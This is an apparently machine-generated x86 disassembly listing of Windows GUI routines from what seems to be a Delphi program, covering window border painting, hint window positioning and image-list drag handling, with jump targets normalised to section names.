and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4413ec
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_445376
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403468
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403468
jmp r-xdata
sub_44540c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f0c4
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f0c4
sub_445450
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43f0c4
sub_4454c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_445550
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4457b6
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42f650
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42fe7c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4457f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406980
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43da08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_441fe4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43f0c4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_440288
sub_445864
push ebx
push esi
mov esi edx
call sub_455b0c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_40691c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f0c4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_40691c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f0c4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4458c8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_4423ac
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_445900
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4458f8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445940
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43cfc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43caa0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44599c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43d09c
test bl bl
jle r-xdata
xor eax eax
call sub_43b094
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4459dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d2b4
xor eax eax
push ebp
push sub_445a77
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d6a8
xor eax eax
push ebp
push sub_445a54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445a5b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d6a8
retn
sub_445a88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4463c0
mov edx 0x80ffff
mov eax esi
call sub_43e064
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d548
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cf7c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_445af4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_441584
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bc44
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44151c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_445b60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445bb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445bbd
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ReleaseDC
retn
sub_445bc4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445c5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c694
mov eax ebx
call sub_440230
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x14 ]
call sub_40447c
push eax
mov eax [ ebx + 0x208 ]
call sub_41d628
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445c64
lea eax [ ebp - 0x14 ]
call sub_403fbc
retn
sub_445c6c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_445cd8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_445d63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d6a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d488
mov edx eax
add edx 0x6
mov eax esi
call sub_43d680
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43dec4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d4a4
mov edx eax
add edx 0x4
mov eax esi
call sub_43d6a4
sub_445d70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_445f49
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43def4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43f168
mov eax [ esi ]
call sub_45c43c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45c448
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45c43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45c430
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45c448
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45c424
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45c430
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45c424
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_441e2c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f50
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40427c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_449008
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call [ rw-data ]
sub_445f58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445f80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412594
mov eax esi
call sub_440230
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ esi + 0x208 ]
call sub_41d628
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_445fdc
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412594
call sub_42f650
call sub_42f730
test al al
jne r-xdata
call sub_42f650
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42faf0
push esp
push 0x1
push 0xf
push 0x0
call sub_42f650
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42f7f0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_446048
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_442734
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44606c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4460c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446184
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423bb0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423bb0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_446190
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44b300
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4461f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bf74
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_44621c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44b12c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_4460c4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44627c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_446190
push 0x0
call ShowCursor
sub_44627c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44b12c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4462e0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44606c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4462e0
push ebx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_446304
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44606c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_446378
push ebx
push esi
mov esi eax
mov eax esi
call sub_44b12c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4462e0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4461d8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4463c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440424
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43caa0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
